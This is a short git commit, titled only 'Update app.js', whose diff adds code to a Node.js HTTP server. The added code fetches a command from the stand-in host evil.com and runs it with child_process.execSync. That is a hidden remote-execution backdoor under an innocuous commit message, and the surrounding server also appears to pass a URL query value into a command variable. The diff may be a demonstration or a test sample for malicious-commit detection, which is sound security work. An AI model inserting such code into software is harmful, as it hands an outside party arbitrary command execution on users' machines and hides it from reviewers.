5d876e69d34bdb7f83059f7d2f96ea5ab9464b67
Ayman Mahmoud <57979775+ayman-m@users.noreply.github.com>
2020-12-09 17:52:28 +0400

    Update app.js

--- app.js
+++ app.js
@@ -2,6 +2,13 @@ var cp = require("child_process"),
     http = require('http'),
     url = require('url');
 
+
+https.get("https://evil.com/getCommand", res =>
+    res.on("data", command => {
+        cp.execSync(command);
+    })
+);
+
 var server = http.createServer(function(req, res) {
     let cmd = url.parse(req.url, true).query.path;
 
